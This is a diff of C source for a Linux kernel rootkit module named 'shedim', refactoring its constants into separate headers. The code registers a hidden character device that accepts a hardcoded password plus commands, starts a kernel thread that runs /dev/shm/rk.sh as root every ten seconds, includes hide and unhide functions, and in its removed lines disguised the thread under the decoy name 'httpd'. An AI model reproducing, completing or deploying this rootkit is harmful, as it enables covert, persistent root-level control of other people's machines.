@@ -16,19 +16,8 @@
 #include <asm/paravirt.h>
 #include <asm/pgtable.h>
 
-#define RK_NAME "shedim"
-#define RK_DECOY_NAME "httpd"
-#define DEBUG 1
-#define CMD "/dev/shm/rk.sh"
-#define PASSWORD "secret"
-#define PASSWORD_LEN 6
-#ifdef DEBUG
-#define DEVICE_NAME "rk"
-#else
-#define DEVICE_NAME "null"
-#endif
-#define BUF_SIZE 256
-
+#include "safe_str.h"
+#include "defs.h"
 
 #define MIN(a,b) \
 	({ typeof (a) _a = (a); \
@@ -50,6 +39,7 @@ extern unsigned long __force_order;
 
 void rk_hide(void);
 void rk_unhide(void);
+void rk_start_cmd_thread(void);
 
 static int
 device_open(struct inode *inode, struct file *file)
@@ -86,10 +76,10 @@ device_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
 	printk(KERN_INFO "%s: writing %ld characters.", RK_NAME, len);
 	printk(KERN_INFO "%s: writing buf=%s", RK_NAME, msg_buf);
 #endif
-	if (!strncmp(msg_buf, PASSWORD, MIN(PASSWORD_LEN, len))) {
+	if (!strncmp(msg_buf, RK_PASSWORD, MIN(RK_PASSWORD_LEN, len))) {
 		// The 1 is to account for the space.
-		const char *cmd = msg_buf+PASSWORD_LEN+1;
-		int cmd_len = len-PASSWORD_LEN-1;
+		const char *cmd = msg_buf+RK_PASSWORD_LEN+1;
+		int cmd_len = len-RK_PASSWORD_LEN-1;
 #ifdef DEBUG
 		printk(KERN_INFO "%s: cmd=%s", RK_NAME, cmd);
 #endif
@@ -100,7 +90,7 @@ device_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
 		} else if (!strncmp(cmd, "run", MIN(3, cmd_len))) {
 			rk_start_cmd_thread();
 		} else if (!strncmp(cmd, "stop", MIN(3, cmd_len))) {
-			if (thread_running != 1) return;
+			if (thread_running != 1) return len;
 			kthread_stop(rk_kthread);
 			thread_running = 0;
 		}
@@ -118,12 +108,12 @@ static struct file_operations fops = {
 
 void rk_dev_init_module(void)
 {
-	register_chrdev(0, DEVICE_NAME, &fops);
+	register_chrdev(0, RK_DEVICE_NAME, &fops);
 }
 
 void rk_dev_cleanup_module(void)
 {
-	unregister_chrdev(0, DEVICE_NAME);
+	unregister_chrdev(0, RK_DEVICE_NAME);
 }
 
 asmlinkage int
@@ -145,7 +135,7 @@ rk_thread(void *data)
 #ifdef DEBUG
 		pr_info("%s: executing %s\n", RK_NAME, CMD);
 #endif
-		call_usermodehelper(CMD, NULL, NULL, UMH_NO_WAIT);
+		call_usermodehelper(RK_CMD, NULL, NULL, UMH_NO_WAIT);
 		msleep(10000);
 	} while(!kthread_should_stop());
 #ifdef DEBUG
@@ -164,11 +154,7 @@ rk_start_cmd_thread(void)
 #ifdef DEBUG
 	pr_info("%s: starting kernel thread on cpu %d\n", RK_NAME, cpu);
 #endif
-#ifdef DEBUG
 	rk_kthread = kthread_create(rk_thread, &cpu, RK_NAME);
-#else
-	rk_kthread = kthread_create(rk_thread, &cpu, RK_DECOY_NAME);
-#endif
 	kthread_bind(rk_kthread, cpu);
 	wake_up_process(rk_kthread);
 }
